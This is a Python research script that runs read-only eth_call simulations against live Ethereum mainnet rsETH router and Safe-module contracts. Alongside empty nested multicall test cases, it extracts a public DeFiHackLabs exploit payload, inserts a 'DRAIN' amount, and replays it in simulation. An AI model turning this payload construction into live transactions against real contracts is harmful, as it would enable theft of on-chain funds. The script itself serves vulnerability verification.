#!/usr/bin/env python3
import os as _os; _os.chdir(_os.path.dirname(_os.path.abspath(__file__)))
"""Live eth_call matrix for the rsETH router/Safe-module finding (read-only)."""
import json, os, re, urllib.request

def _env(name):
    v = os.environ.get(name)
    if v:
        v = v.strip().strip('"').strip("'")
        if v:
            return v
    try:
        for line in open("/home/heisenberg/CA/.env"):
            if line.startswith(name + "="):
                return line.strip().split("=", 1)[1].strip('"').strip("'")
    except FileNotFoundError:
        pass
    return None

RPC = _env("NODEREAL_ETH_RPC_URL") or _env("FORK_RPC_URL") or _env("RPC_URL") or "https://ethereum-rpc.publicnode.com"
if RPC.startswith("https://rpc.flashbots"):
    RPC = "https://ethereum-rpc.publicnode.com"

def rpc(method, params):
    body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": method, "params": params}).encode()
    req = urllib.request.Request(RPC, data=body, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=40) as r:
        return json.load(r)

def enc_bytes(b: bytes) -> str:
    l = len(b); pad = (-l) % 32
    return f"{l:064x}" + b.hex() + ("00" * pad)

def enc_array_bytes(items):
    raw = [i if isinstance(i, bytes) else bytes.fromhex(i[2:]) for i in items]
    n = len(raw); offs = []; body = b""; cur = 32 * n
    for it in raw:
        e = bytes.fromhex(enc_bytes(it)); offs.append(cur); body += e; cur += len(e)
    return f"{n:064x}" + "".join(f"{o:064x}" for o in offs) + body.hex()

def multicall(addr, datas):
    return "0x00c25829" + f"{int(addr,16):064x}" + f"{0x40:064x}" + enc_array_bytes(datas)

ROUTER = "0x4f0055926c839D1d960a82CBF84E2eE933958ebC"
MODULE = "0xeA18B13d11f705a68F0954f637949e1eaA7AC4ca"
M2 = "0xd479bcc84a6f972742ff19af23acf6b0c9253200"
M3 = "0xf73a5695bd538d09999f1987cfc43fd56eca59cc"
SIB1 = "0x853778e4a7d0827d94a313eef821894551eca00b"
SIB2 = "0x9efa4021294860de01fdd259e96ee920c1ac4711"

CASES = {
    "T1_router_empty": (ROUTER, multicall(ROUTER, [])),
    "T2_self_nested_empty": (ROUTER, multicall(ROUTER, [multicall(ROUTER, [])])),
    "T3_self_module_empty": (ROUTER, multicall(ROUTER, [multicall(MODULE, [])])),
    "T4_direct_module_empty": (ROUTER, multicall(MODULE, [])),
    "T5_self_M2_empty": (ROUTER, multicall(ROUTER, [multicall(M2, [])])),
    "T6_self_M3_empty": (ROUTER, multicall(ROUTER, [multicall(M3, [])])),
    "T7_self_sib1_empty": (ROUTER, multicall(ROUTER, [multicall(SIB1, [])])),
    "S1_sib1_self_empty": (SIB1, multicall(SIB1, [])),
    "S2_sib1_self_module": (SIB1, multicall(SIB1, [multicall(MODULE, [])])),
    "S3_sib1_direct_module": (SIB1, multicall(MODULE, [])),
    "S4_sib2_self_module": (SIB2, multicall(SIB2, [multicall(MODULE, [])])),
    "S5_sib2_direct_module": (SIB2, multicall(MODULE, [])),
}

# Extract the public exploit payload from the DeFiHackLabs diff and build the exact chain
def load_poc():
    txt = open("difhack1262.diff").read()
    def grab(name):
        m = re.search(rf"RC_{name}\s*=\s*hex\"([0-9a-f]+)\"", txt)
        return bytes.fromhex(m.group(1))
    head, mid, tail = grab("HEAD"), grab("MID"), grab("TAIL")
    DRAIN = 2899999999999997756820
    payload = head + DRAIN.to_bytes(32, "big") + mid + DRAIN.to_bytes(32, "big") + tail
    return payload

try:
    poc = load_poc()
    CASES["P1_self_module_POCpayload_latest"] = (ROUTER, multicall(ROUTER, [multicall(MODULE, [poc])]))
    CASES["P2_direct_module_POCpayload_latest"] = (ROUTER, multicall(MODULE, [poc]))
except Exception as e:
    print("POC parse failed:", e)

CALLER = "0x1111111111111111111111111111111111111111"
out = {}
for name, (to, data) in CASES.items():
    res = rpc("eth_call", [{"from": CALLER, "to": to, "data": data}, "latest"])
    if "result" in res:
        out[name] = {"ok": True, "result": res["result"][:100]}
    else:
        out[name] = {"ok": False, "error": json.dumps(res.get("error"))}
    print(f"{name:42s} -> {json.dumps(out[name])[:150]}")

json.dump(out, open("matrix_results.json", "w"), indent=1)
blk = rpc("eth_blockNumber", [])
print("block", int(blk["result"], 16))
